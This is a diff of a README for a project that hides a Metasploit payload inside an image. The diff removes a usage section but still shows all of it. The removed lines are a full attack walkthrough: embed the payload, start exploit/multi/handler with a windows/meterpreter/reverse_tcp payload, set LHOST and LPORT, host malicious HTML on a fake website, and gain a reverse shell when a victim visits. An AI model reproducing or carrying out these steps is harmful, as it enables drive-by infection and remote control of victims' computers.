@@ -13,49 +13,13 @@ This project demonstrates how to create a Metasploit module that embeds a payloa
 - Ruby programming language
 - Metasploit framework
 
-## Basic Usage
+## Basic Install (see INSTALL for more info)
 
 1. Clone the repository:
 `git clone https://github.com/your-username/embedded-image-payload.git`
 
 2. Install the required dependencies:
 `bundle install`
-
-3. Customize the module and payload:
-- Open the `module.rb` file and modify the module options, such as the image path and output path.
-- Open the `payload.rb` file and customize the payload generation and obfuscation techniques as needed.
-
-4. Generate the payload and embed it into the image:
-`ruby exploit.rb`
-
-5. Set up the Metasploit handler:
-- Open a new terminal window and start the Metasploit console:
-  ```rb
-  msfconsole
-  ```
-- Select the `exploit/multi/handler` module:
-  ```rb
-  use exploit/multi/handler
-  ```
-- Set the payload to match the one used in the malicious HTML file:
-  ```rb
-  set PAYLOAD windows/meterpreter/reverse_tcp
-  ```
-- Set the `LHOST` and `LPORT` options to specify the IP address and port for the
-  ```rb
-  set LHOST YOUR_IP
-  set LPORT 4444
-  ```
-- Start the handler:
-  ```rb
-  run
-  ```
-
-6. Create a fake website to host the html for the victim.
-
-7. Once the payload is executed, a reverse shell connection will be established, and you can interact with the target machine using Meterpreter commands.
-
-8. The target machine gets infected visiting malicious website.
 
 ## Creating the payload and handler
 
